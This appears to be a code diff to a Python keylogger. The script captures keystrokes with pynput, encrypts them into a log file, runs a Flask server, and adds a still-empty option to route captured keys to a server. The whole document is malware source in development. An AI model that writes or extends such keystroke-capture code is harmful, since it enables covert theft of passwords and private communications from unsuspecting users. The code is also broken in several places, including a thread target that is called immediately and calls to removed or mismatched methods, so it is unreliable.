@@ -1,6 +1,8 @@
 import base64
 from datetime import datetime
 import threading
+from threading import Thread
+
 from pynput import keyboard
 import time
 from flask import Flask, request
@@ -37,12 +39,17 @@ class KeyLogger:
         self.listener = None
         self.stop = False
 
-    def start(self):
+    def start(self, time_to_run=0):
         self.listener = keyboard.Listener(on_press=self.on_press)
         self.listener.start()
-        while not self.stop:
-            time.sleep(60)
-            self.save_and_clear()
+        if time_to_run == 0:
+            while not self.stop:
+                time.sleep(60)
+                self.save_and_clear()
+        else:
+            for _ in range(time_to_run):
+                time.sleep(60)
+            self.listener.stop()
 
     def on_press(self, key):
         with self.lock:
@@ -59,23 +66,18 @@ class KeyLogger:
             keys_copy = self.current_keys.copy()
             self.current_keys.clear()
         if keys_copy:
-            Writer().add_writing(keys_copy)
-
-    def stop_after_time(self, run_time: int):
-        for _ in range(run_time):
-            time.sleep(60)
-            self.save_and_clear()
-        self.listener.stop()
+            if self.routing == 'file':
+                Writer().add_writing(keys_copy)
+            elif self.routing == 'server':
+                Writer().write_to_server()
 
     def stop_listen(self):
         self.listener.stop()
-        self.save_and_clear()
         self.stop = True
 
     def routing_to_save(self, route):
-        if self.routing == 'file':
-            with open("encrypted_logs.txt", "a", encoding="utf-8") as f:
-                f.write(f"[{log_time}] {encrypted_str}\n")
+        if route == 'server':
+            self.routing = route
 
 
 class Writer:
@@ -87,6 +89,9 @@ class Writer:
 
         with open("encrypted_logs.txt", "a", encoding="utf-8") as f:
             f.write(f"[{log_time}] {encrypted_str}\n")
+
+    def write_to_server(self):
+        pass
 
 
 class EncryptorDecryptor:
@@ -129,25 +134,31 @@ class EncryptorDecryptor:
                 print(f"{line[:timestamp_end + 1]} {decrypted_str}")
 
 
-class Manger:
+class Manager:
     def __init__(self):
         self.key_loger = KeyLogger()
+        self.thread = threading.Thread(target=self.stop())
 
     def start(self):
         self.key_loger.start()
 
     def stop(self):
+        self.thread.start()
         self.key_loger.stop_listen()
 
-    def run_time(self):
-        pass
+    def run_time(self, time: int):
+        self.start(time)
 
     def route(self, routing='file'):
-        self.key_loger.routing(routing)
+        self.key_loger.routing_to_save(routing)
 
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
+
+m = Manager()
+m.start()
+m.stop()
 
 KeyLogger(10).stop_after_time()
 
